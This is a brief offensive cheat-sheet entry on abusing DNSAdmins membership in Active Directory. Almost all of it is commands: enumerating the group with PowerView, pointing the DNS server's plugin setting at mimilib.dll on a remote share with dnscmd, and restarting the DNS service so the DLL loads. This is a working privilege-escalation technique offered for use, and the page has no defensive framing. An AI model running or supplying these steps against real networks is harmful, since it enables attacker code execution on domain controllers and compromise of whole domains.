# DNS Admins

**Enumerate member of the DNS admin group**

```
Get-NetGRoupMember “DNSAdmins”
```

**From the privilege of DNS Admins group member, configure DDL using dnscmd.exe (needs RSAT DNS)**

Share the directory the ddl is in for everyone so its accessible. logs all DNS queries on C:\Windows\System32\kiwidns.log

```
Dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
```

**Restart DNS**

```
Sc \\<dns server> stop dns
Sc \\<dns server> start dns
```
